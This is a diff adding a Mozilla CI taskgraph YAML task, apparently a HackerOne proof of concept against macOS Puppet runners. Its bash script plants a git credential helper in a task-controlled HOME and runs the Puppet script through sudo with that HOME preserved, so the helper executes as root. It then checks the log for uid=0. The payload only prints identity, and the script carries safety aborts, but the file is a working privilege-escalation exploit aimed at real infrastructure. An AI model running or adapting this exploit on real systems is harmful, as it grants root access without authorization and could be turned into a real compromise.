@@ -1,0 +1,127 @@
+# This Source Code Form is subject to the terms of the Mozilla Public
+# License, v. 2.0. If a copy of the MPL was not distributed with this
+# file, You can obtain one at http://mozilla.org/MPL/2.0/.
+---
+loader: taskgraph.loader.transform:loader
+
+transforms:
+    - gecko_taskgraph.transforms.task:transforms
+
+tasks:
+    macos-puppet-git-credential-helper:
+        description: >-
+            HackerOne security research canary for sudo-preserved HOME in the
+            macOS Puppet runner. The helper prints root identity and exits
+            before Git updates the checkout or Puppet starts.
+        attributes:
+            code-review: true
+        run-on-projects: []
+        worker-type: t-osx-1500-m4
+        treeherder:
+            symbol: h1git
+            kind: other
+            tier: 3
+            platform: macosx1500-aarch64/opt
+        worker:
+            implementation: generic-worker
+            os: macosx
+            max-run-time: 600
+            chain-of-trust: false
+            env: {}
+            command:
+                - - /bin/bash
+                  - -c
+                  - |
+                    set -euo pipefail
+
+                    repo=/opt/puppet_environments/mozilla-platform-ops/ronin_puppet
+                    expected_remote=https://github.com/mozilla-platform-ops/ronin_puppet.git
+                    settings=/opt/puppet_environments/ronin_settings
+
+                    echo "H1_SAFE_ROOT_GIT_CANARY_START"
+                    echo "H1_TASK_USER=$(id -un)"
+                    id
+
+                    if [ "$(id -un)" != cltbld ]; then
+                        echo "H1_PREFLIGHT_ABORT unexpected-task-user"
+                        exit 10
+                    fi
+
+                    sudo -n -l /usr/local/bin/run-puppet.sh
+
+                    if [ -e "$settings" ]; then
+                        echo "H1_PREFLIGHT_ABORT override-settings-present"
+                        exit 11
+                    fi
+
+                    if [ ! -d "$repo/.git" ]; then
+                        echo "H1_PREFLIGHT_ABORT puppet-checkout-missing"
+                        exit 12
+                    fi
+
+                    remote="$(git -c safe.directory="$repo" -C "$repo" remote get-url origin 2>/dev/null || true)"
+                    if [ "$remote" != "$expected_remote" ]; then
+                        echo "H1_PREFLIGHT_ABORT unexpected-remote=$remote"
+                        exit 13
+                    fi
+
+                    before_head="$(git -c safe.directory="$repo" -C "$repo" rev-parse HEAD)"
+                    proof_home="$(mktemp -d "$PWD/h1-home.XXXXXX")"
+                    cleanup() {
+                        chmod -R u+w "$proof_home" 2>/dev/null || true
+                        rm -rf -- "$proof_home"
+                    }
+                    trap cleanup EXIT
+
+                    helper="$proof_home/h1-credential-helper.sh"
+                    printf '%s\n' \
+                        '#!/bin/sh' \
+                        'printf "H1_ROOT_GIT_CREDENTIAL_HELPER action=%s uid=%s\\n" "$1" "$(id -u)" >&2' \
+                        '/usr/bin/id >&2' \
+                        'if [ "$1" = get ]; then' \
+                        '    printf "username=h1-benign-canary\\npassword=h1-benign-canary\\n"' \
+                        'fi' \
+                        'exit 0' > "$helper"
+                    chmod 0755 "$helper"
+
+                    HOME="$proof_home" git config --global http.extraHeader \
+                        'Authorization: Basic aW52YWxpZDppbnZhbGlk'
+                    HOME="$proof_home" git config --global credential.helper "!$helper"
+                    HOME="$proof_home" git config --global credential.interactive false
+
+                    resolved_remote="$(HOME="$proof_home" git -c safe.directory="$repo" -C "$repo" remote get-url origin)"
+                    if [ "$resolved_remote" != "$expected_remote" ]; then
+                        echo "H1_PREFLIGHT_ABORT helper-changed-remote=$resolved_remote"
+                        exit 14
+                    fi
+
+                    echo "H1_PREFLIGHT_OK checkout=$before_head remote=$resolved_remote"
+                    log="$proof_home/root-run.log"
+
+                    set +e
+                    HOME="$proof_home" sudo -n /usr/local/bin/run-puppet.sh 2>&1 | tee "$log"
+                    root_run_status=${PIPESTATUS[0]}
+                    set -e
+
+                    after_head="$(git -c safe.directory="$repo" -C "$repo" rev-parse HEAD)"
+                    helper_seen=false
+                    if grep -q 'H1_ROOT_GIT_CREDENTIAL_HELPER action=get uid=0' "$log" &&
+                        grep -q 'uid=0(root)' "$log"; then
+                        helper_seen=true
+                    fi
+
+                    echo "H1_ROOT_RUN_STATUS=$root_run_status"
+                    echo "H1_CHECKOUT_UNCHANGED=$([ "$before_head" = "$after_head" ] && echo true || echo false)"
+                    echo "H1_ROOT_HELPER_SEEN=$helper_seen"
+
+                    if [ "$root_run_status" -ne 0 ] &&
+                        [ "$before_head" = "$after_head" ] &&
+                        [ "$helper_seen" = true ] &&
+                        ! grep -q 'Running Puppet apply' "$log"; then
+                        echo "RESULT: TASK-CONTROLLED HOME TO ROOT GIT HELPER EXECUTION CONFIRMED"
+                        echo "SAFETY: Git stopped on the deliberate 401 before reset or Puppet apply"
+                        exit 0
+                    fi
+
+                    echo "RESULT: CANARY FAILED OR SAFETY INVARIANT NOT MET"
+                    exit 1
